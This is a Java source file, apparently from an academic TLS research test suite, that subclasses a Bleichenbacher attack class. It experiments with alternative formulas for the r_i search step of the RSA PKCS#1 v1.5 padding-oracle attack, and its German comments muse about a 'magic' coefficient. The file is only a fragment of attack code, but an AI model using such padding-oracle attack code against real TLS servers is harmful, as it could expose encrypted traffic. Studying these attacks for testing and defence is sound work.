/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher;

import de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher.oracles.StandardOracle;
import de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher.BleichenbacherAttackCrypto;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;

/**
 *
 * @author juraj
 * 
 * For experimentation purposes :)
 */
public class BleichenbacherAttackCustom extends BleichenbacherAttackCrypto {
    
    private static final int MAGIC_VALUE = 200;
    private int magicValue = 2;
    public static final int RI_SEARCH_DEFAULT = 0;
    public static final int RI_SEARCH_1 = 1;
    public static final int RI_SEARCH_2 = 2;
    private int search;
    
    public BleichenbacherAttackCustom(final byte[] msg, RSAPublicKey pubKey,
            StandardOracle pkcsOracle, int maxtUsed, final boolean msgPKCSconform) {
        super(msg, pubKey, pkcsOracle, maxtUsed, msgPKCSconform);
    }
    
    
     private BigInteger findRi() {
        BigInteger ri;
        BigInteger n = publicKey.getModulus();
        int x = 2;
        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        ri = si.multiply(m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));

        // das verstehe ich eigentlich nicht, was macht da diese "2"?
        //                ri = ri.multiply(BigInteger.valueOf(2));
        // hmmm, wahrscheinlich ist es nur ein magic coefficient, den man einstellen kann, versuch damit zu spielen, ist echt nett
        //                ri = ri.multiply(BigInteger.valueOf(MAGIC_VALUE));
        ri = ri.multiply(BigInteger.valueOf(x));
        ri = ri.divide(n);

        return ri;
    }

    private BigInteger findRi1() {
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger ri;
        BigInteger n = publicKey.getModulus();
        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        ri = si.multiply(m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));

        ri = ri.multiply(BigInteger.valueOf(magicValue + 1));
        ri = ri.divide(n);

//        // initial si computation
//        upperBound = step2cComputeUpperBound(ri, n,
//                m[0].lower);
//        lowerBound = step2cComputeLowerBound(ri, n,
//                m[0].upper);
        return ri;
    }

    private BigInteger findRi2() {
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger ri;
        BigInteger n = publicKey.getModulus();

        ri = BigInteger.valueOf(magicValue).multiply(m[0].upper).multiply(m[0].lower);
        ri = ri.subtract(bigB.multiply(BigInteger.valueOf(3).multiply(m[0].upper).
                subtract(BigInteger.valueOf(2).multiply(m[0].lower))));
        ri = ri.divide(n.multiply(m[0].upper.subtract(m[0].lower)));
        if (ri.compareTo(BigInteger.valueOf(50000)) < 0) {
            return findRi();
        }

//        upperBound = step2cComputeUpperBound(ri, n,
//                m[0].lower);
//        lowerBound = step2cComputeLowerBound(ri, n,
//                m[0].upper);

//        if(upperBound.subtract(lowerBound).compareTo(BigInteger.valueOf(magicValue)) < 0)
//        System.out.println("Difference: " + upperBound.subtract(lowerBound));

        return ri;
    }
    
}
